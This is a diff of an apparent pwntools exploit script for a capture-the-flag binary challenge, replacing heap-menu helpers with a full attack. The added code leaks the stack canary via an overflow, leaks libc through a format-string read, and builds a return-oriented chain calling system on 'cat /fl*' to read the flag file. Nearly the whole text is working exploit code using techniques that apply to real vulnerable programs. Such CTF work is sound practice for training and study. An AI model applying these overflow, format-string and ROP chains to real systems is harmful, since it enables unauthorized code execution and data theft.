@@ -56,27 +56,48 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
-def add(index,content='a'*8):
-	sla(':',_add)
-	sla(':',index)
-	sa(':',content)
-
-def free(index):
-	sla(':',_free)
-	sla(':',index)
-
-def edit(index,content):
-	sla(':',_edit)
-	sla(':',index)
-	sa(':',content)
-
-def show(index):
-	sla(':',_show)
-	sla(':',index)
-
 # start
+def bored(payload,cont):
+	sla('bored...\n', payload)
+	sla('y/n\n',cont)
 
+def stack(payload):
+	sla('option:', 1)
+	sa('once..\n',payload)
+
+def fsb(payload):
+	sla('option:', 3)
+	sa('?)\n',payload)
+
+def secret(payload):
+	sla('option:',9011)
+	sa('code:',payload)
+
+sla('option:',2)
+for i in range(4):
+	bored('a','n')
+bored('a','y')
+stack('a'*0xa8 + 'a')
+r(0xa9)
+canary = u64('\x00' + r(7))
+leak('canary', canary)
+
+fsb('%a')
+ru('0x0.0')
+base = int(ru('p-'),16) - libc.sym['_IO_2_1_stdout_'] - 131
+leak('base',base)
+system = base + libc.sym['system']
+
+pop_rdi = 0x400c53
+payload = flat('cat /fl*',canary,'a'*8,pop_rdi,0x602080,system)
+sla('option:',2)
+bored(payload,'y')
+
+try:
+	for i in range(9999):
+		secret('\x00')
+except:
+	p.close()
 # end
 
 p.interactive()
